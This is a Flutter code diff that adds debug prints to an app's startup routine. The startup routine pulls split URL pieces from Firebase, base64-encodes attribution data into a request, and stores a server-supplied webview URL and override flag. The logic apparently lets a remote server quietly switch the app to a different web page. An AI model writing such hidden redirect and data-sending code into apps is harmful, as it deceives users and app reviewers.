@@ -110,7 +110,7 @@ void main() async {
     await Firebase.initializeApp();
     try {
       ///Get data from firebase database
-
+      print('7');
       final data = await FirebaseDatabase.instance
           .reference()
           .child(Settings.databaseRoot)
@@ -123,7 +123,7 @@ void main() async {
       ///
 
       ///Get traffic data
-
+      print('6');
       final String appsflyerId = data[Settings.appsflyer];
       final appsflyerData = await _getAppsFlyerData(appsflyerId);
       if (appsflyerData == null) {
@@ -138,8 +138,9 @@ void main() async {
       ///
 
       ///Create request
-
-      final url = data[Settings.baseUrl1] + data[Settings.baseUrl2];
+      print('5');
+      final url = data[Settings.baseUrl1] + data[Settings.baseUrl2] + Settings.urlPath;
+      print(url);
       // print(requestData);
       final encodedData = base64Encode(utf8.encode(requestData.toString()));
       // print(encodedData);
@@ -148,7 +149,7 @@ void main() async {
           queryParameters: {Settings.queryParamName: encodedData});
 
       ///
-
+      print('4');
       final response = await http.get(request);
 
       final body = jsonDecode(response.body);
@@ -157,15 +158,16 @@ void main() async {
       final requestUrl2 =
           (body[Settings.url21key] ?? '') + (body[Settings.url22key] ?? '');
       final overrideUrl = body[Settings.overrideUrlKey] ?? false;
-
+      print('3');
       ///Save for next launches
       prefs.setBool(Settings.initiated, true);
       prefs.setString(Settings.webViewUrl, requestUrl2);
       prefs.setBool(Settings.overrideUrlKey, overrideUrl);
 
       ///
-
+      print('2');
       modeRunner(requestUrl1, overrideUrl);
+      print('1');
     } catch (e) {
       print('Error occurred: $e');
       runApp(Application());
